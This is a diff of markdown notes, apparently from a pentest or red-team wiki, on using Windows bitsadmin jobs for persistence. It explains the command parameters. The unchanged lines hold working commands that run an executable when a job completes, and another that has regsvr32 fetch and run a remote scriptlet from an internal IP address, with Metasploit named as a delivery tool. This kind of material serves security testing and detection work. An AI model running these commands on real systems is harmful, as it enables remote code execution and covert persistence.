@@ -24,10 +24,12 @@ bitsadmin /SetNotifyCmdLine shell C:\tmp\shen.exe NULL
 bitsadmin /SetMinRetryDelay "shell" 60
 bitsadmin /resume shell
 ```
-1. The `/create` parameter is used to specify what type of jobs you want to create and the name of the job when not specifying the type it will default to `Download`. `bitsadmin /create [type] displayname`
-2. The `/addfile` parameter is used to add a file into a specific job which as a value we can add the name of the job, a remoteURL that contains a file or a local file and the output name and location. `bitsadmin /addfile <job> <remoteURL> <localname>`
-3. The `/SetNotifyCmdLine` parameter is used to run a cli command after a job was done transferring data. `bitsadmin /setnotifycmdline <job> <program_name> [program_parameters]
-`
+1. The `/create` parameter is used to specify what type of jobs you want to create and the name of the job when not specifying the type it will default to `Download`. 
+	`bitsadmin /create [type] displayname`
+2. The `/addfile` parameter is used to add a file into a specific job which as a value we can add the name of the job, a remoteURL that contains a file or a local file and the output name and location. 
+	`bitsadmin /addfile <job> <remoteURL> <localname>`
+3. The `/SetNotifyCmdLine` parameter is used to run a cli command after a job was done transferring data. 
+	`bitsadmin /setnotifycmdline <job> <program_name> [program_parameters]`
 4. The `/SetMinRetryDelay` parameter is used to set how many seconds to wait before retrying to download a file once again that failed. `bitsadmin /setminretrydelay <job> <retrydelay>
 `
 5. The `/resume` parameter is used to activate the job. 
@@ -39,10 +41,13 @@ bitsadmin /SetNotifyCmdLine shell regsvr32.exe "/s /n /u /i:http://192.168.1.43/
 bitsadmin /resume shell
 ```
 
-The metasploit module `exploit/multi/script/web_delivery` uses regsvr32 to deliver payloads. And it is also possible to generate one for cobalt strike through aggressor scripts.
-	
+The metasploit module `exploit/multi/script/web_delivery` uses regsvr32 to deliver payloads.
+
 ## Resources:
 https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/
+
 https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1197/T1197.md
+
 https://pentestlab.blog/2019/10/30/persistence-bits-jobs/
+
 http://0xthem.blogspot.com/2014/03/t-emporal-persistence-with-and-schtasks.html
